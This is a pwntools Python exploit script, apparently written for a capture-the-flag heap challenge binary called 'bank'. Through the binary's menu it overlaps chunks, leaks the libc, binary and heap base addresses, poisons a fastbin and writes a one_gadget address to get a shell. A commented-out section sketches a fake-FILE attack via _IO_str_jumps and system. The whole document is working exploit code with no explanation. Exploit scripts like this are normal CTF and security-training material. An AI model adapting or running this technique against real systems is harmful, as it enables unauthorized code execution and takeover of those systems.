#!/usr/bin/python3
from pwn import *
context.log_level = 'debug'
context(arch='amd64', os='linux')
#context(arch='i386', os='linux')
context.terminal = ['tmux','splitw','-h']
elf = context.binary = ELF('./bank')
libc = elf.libc

gs = '''
continue
'''
def start():
    if args.GDB:
        return gdb.debug(elf.path,gdbscript=gs)
    elif args.REM:
        return remote("",)
    else:
        return process(elf.path)

io = start()

sl      = lambda s : io.sendline(s)
sa      = lambda delim,data : io.sendafter(str(delim), str(data))
sla     = lambda delim,data : io.sendlineafter(str(delim), str(data))
sn      = lambda s : io.send(s)
rc      = lambda n : io.recv(n)
rl      = lambda s : io.recvline(s)
#ru = lambda s : io.recvuntil(s)
ru      = lambda delim,drop=True : io.recvuntil(delim, drop)
uu32    = lambda data            : u32(data.ljust(4, '\x00'))
uu64    = lambda data            : u64(data.ljust(8, '\x00'))
lg      = lambda s,addr          : io.success('\033[1;31;40m%20s-->0x%x\033[0m'%(s,addr))
ti      = lambda : io.interactive()

def malloc(title, stat):
    io.sendlineafter('5. View your bank status', '1')
    io.sendafter(' bank account:', title)
    io.sendlineafter('bank statement:', str(len(stat)+1))
    io.sendline(stat)
    io.recvuntil('index')

def title(idx, title):
    io.sendlineafter('5. View your bank status', '2')
    io.sendlineafter(' bank account:', str(idx))
    io.send(title)

def stat(idx, stat):
    io.sendlineafter('5. View your bank status', '3')
    io.sendlineafter(' bank account:', str(idx))
    io.sendline(stat)

def free(idx):
    io.sendlineafter('5. View your bank status', '4')
    io.sendlineafter(' bank account:', str(idx))

def show(idx):
    io.sendlineafter('5. View your bank status', '5')
    io.sendlineafter(' bank account:', str(idx))



one = [0x45206,0x4525a,0xef9f4,0xf0897]

malloc('x'*0x8, 'a'*0x1f)
malloc('x'*0x8, 'b'*0x1f)#1
#gdb.attach(io)
free(0)
malloc('y'*0x8, 'a'*0x57)#0
malloc('y'*0x8, 'c'*0x57)#2
free(1)
malloc('x'*0x8, 'b'*0x2f)#1

malloc('x'*0x10+'\xe1', 'd'*0x1f)#3
free(0)
malloc('y'*0x8, 'a'*0x57) #0
show(2)
ru('Statement: ')
#libc_base = u64(io.recv(6)+'\x00\x00') - 0x3c1b58
addr = u64(rc(8)[0:6].ljust(8,b"\x00"))
libc_base = addr - 0x3c3b78
lg('libc_base',libc_base)

#input()
malloc('x'*0x8, 'e'*0x1f) #4
show(2)
io.recvuntil('Statement: ')
bin_base = u64(io.recv(8)[0:6].ljust(8,b"\x00")) - 0x202010
lg('bin_base',bin_base)
#
malloc('5'*0x8, 'f'*0x1f)#5
malloc('6'*0x8, 'g'*0x1f)#6
free(5)
malloc('5'*0x8, 'f'*0x57)#5
malloc('7'*0x8, 'h'*0x57)#7
free(6)
malloc('6'*0x8, 'g'*0x2f)#6
#
malloc('8'*0x10+'\xe1', 'j'*0x1f)#8
free(5)
malloc('5'*0x8, 'f'*0x57)#5
free(6)
malloc('6'*0x8, 'g'*0x57)#6
#
free(5)
free(6)
show(7)
io.recvuntil('Statement: ')
heap_base = u64(io.recv(8)[0:6].ljust(8,b"\x00")) - 0x2d0
lg('heap_base',heap_base)

malloc('3'*0x8, 'a'*0x57) #5
malloc('3'*0x8, 'a'*0x57) #6
#
free(5)
free(6)
free(7)
malloc('3'*0x8, p64(bin_base+0x201fa5).ljust(0x57,b'x'))#0x3c3aed libc_base+0x3c5795 0x201f5d 0x201fa5 0x201fdd
malloc('3'*0x8, 'a'*0x57)
malloc('3'*0x8, (b'a'*0x50+p64(0xdeadbeef)[:-1]).decode("iso-8859-1") )

shell = libc_base + one[1]
payload = b"\x00"*3+p64(shell)
#print(hex(len(payload)))

io.sendline('1')
io.sendafter(' bank account:', 'xxxxxxx')
io.sendlineafter('bank statement:', str(0x5f))
pause()
io.send(payload.decode("iso-8859-1"))

#io.sendline('1')
#io.sendafter(' bank account:', 'fffffff')
#io.sendlineafter('bank statement:', str(0x2f))

#
#malloc('a', 'd'*0x1f)
#
#fake_stderr = ''
#fake_stderr += p64(0)  # 0
#fake_stderr += p64(0)*3
#fake_stderr += p64(0) + p64(0x7fffffffffffffff)
#fake_stderr += p64(0)*2
#fake_stderr += p64((libc_base + 0x1619be-100)/2) + p64(0) * 0xb
#fake_stderr += p64(libc_base + 0x399770)
#fake_stderr += p64(0) *3
#fake_stderr += p64(0)
#fake_stderr += p64(0) * 2
#fake_stderr += p64(libc_base +0x394440+0xc0) # _IO_str_jumps
#fake_stderr += p64(libc_base + 0x3f480) # system
#
#io.sendline('1')
#io.sendafter(' bank account:', 'xxxxxxx')
#io.sendlineafter('bank statement:', str(0x67))
#time.sleep(0.1)
#io.sendline(fake_stderr[0:0x60])
#free(10)
#io.sendline('1')
#io.sendafter(' bank account:', 'xxxxxxx')
#io.sendlineafter('bank statement:', str(0x37))
#time.sleep(0.1)
#io.sendline(fake_stderr[0x80:0x80+0x30])
#io.sendline('1')
#io.sendafter(' bank account:', 'xxxxxxx')
#io.sendlineafter('bank statement:', str(0x67))
#time.sleep(0.1)
#io.sendline(fake_stderr[0xd0:])

io.interactive()
